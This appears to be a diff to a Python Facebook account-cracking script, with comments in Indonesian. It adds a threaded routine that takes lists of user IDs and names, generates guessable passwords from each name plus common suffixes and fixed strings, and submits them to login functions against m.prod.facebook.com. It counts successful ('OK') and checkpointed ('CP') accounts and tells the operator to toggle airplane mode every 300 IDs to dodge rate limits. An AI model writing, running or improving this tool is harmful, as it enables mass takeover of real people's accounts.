@@ -1203,7 +1203,7 @@ def metslow():
     print("")
 
 #-------------------[ CRACK-CEPAT ]------------#
-def metcepat():
+def metcepaggt():
     global prog,des
     bi = random.choice([u,k,kk,b,h,hh])
     print('')
@@ -1267,6 +1267,87 @@ def metcepat():
         )
     )
     Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}	[bold yellow]CP ─> {cp}")
+    print("")
+
+def metcepat():
+    global prog, des
+
+    # Memastikan variabel yang digunakan terdefinisi
+    if not isinstance(id2, list) or len(id2) == 0:
+        raise ValueError("Daftar ID (id2) kosong atau tidak valid.")
+
+    if method not in ["validatev1", "validatev2", "reguler", "mbasic"]:
+        raise ValueError(f"Method tidak valid: {method}")
+
+    bi = random.choice([u, k, kk, b, h, hh])
+    print('')
+
+    # Panel untuk menampilkan hasil OK dan CP
+    urut = []
+    urut.append(panel(f'[bold green]%s [bold white]' % (okc), width=30, title=f"[bold green]OK SAVE", style=f"{color_panel}"))
+    urut.append(panel(f'[bold yellow]%s [bold white]' % (cpc), width=30, title=f"[bold yellow]CP SAVE", style=f"{color_panel}"))
+    wa.print(Columns(urut))
+
+    # Menampilkan instruksi mode pesawat
+    awal = datetime.now()
+    Console().print(Panel(f'[bold white]hidup/matikan Mode Pesawat Setiap [bold green]300[bold yellow] ID ',
+                          title=f"[bold yellow]CRACK-CEPAT",
+                          width=60,
+                          style=f"{color_panel}"))
+
+    # Inisialisasi progres
+    prog = Progress(TextColumn('{task.description}'))
+    des = prog.add_task('', total=len(id2))
+
+    with prog:
+        with tred(max_workers=30) as pool:
+            for yuzong in id2:
+                try:
+                    # Memisahkan ID dan nama
+                    idf, nmf = yuzong.split('|')[0], yuzong.split('|')[1].lower()
+                    frs = nmf.split(" ")[0]
+
+                    # Membuat daftar password
+                    pwv = ["rasis123", "rasis1234", "rasis12345", "bismillah"]
+                    if len(nmf) < 6:
+                        if len(frs) >= 3:
+                            pwv.extend([nmf, frs + '321', frs + '123', frs + '1234', frs + '12345', frs + '123456'])
+                    else:
+                        pwv.extend([nmf, frs + '321', frs + '123', frs + '1234', frs + '12345', frs + '123456'])
+
+                    # Menambahkan password tambahan jika `pwpluss` diaktifkan
+                    if 'ya' in pwpluss:
+                        for xpwd in pwnya:
+                            pwv.append(xpwd)
+
+                    # Memanggil metode yang sesuai
+                    if "validatev1" in method:
+                        pool.submit(vipernew, idf, pwv, 'm.prod.facebook.com')
+                    elif "validatev2" in method:
+                        pool.submit(crackprod, idf, pwv)
+                    elif "reguler" in method:
+                        pool.submit(reguler, idf, pwv)
+                    elif "mbasic" in method:
+                        pool.submit(crackbasi, idf, pwv)
+                    else:
+                        pool.submit(reguler, idf, pwv)
+
+                except Exception as e:
+                    print(f"[bold red]Error saat memproses ID: {yuzong}. Detail: {e}")
+
+    # Menampilkan hasil akhir
+    print("")
+    Console().print(
+        Panel(
+            f"[bold green]Crack Telah Selesai, Jangan lupa tobat Kawan",
+            subtitle="╭───",
+            subtitle_align="left",
+            title=f"[bold green]Cek Opsi",
+            width=60,
+            style=f"{color_panel}",
+        )
+    )
+    Console().print(f"[bold cyan]   ╰[bold green] OK ─> {ok}    [bold yellow]CP ─> {cp}")
     print("")
 	
 	
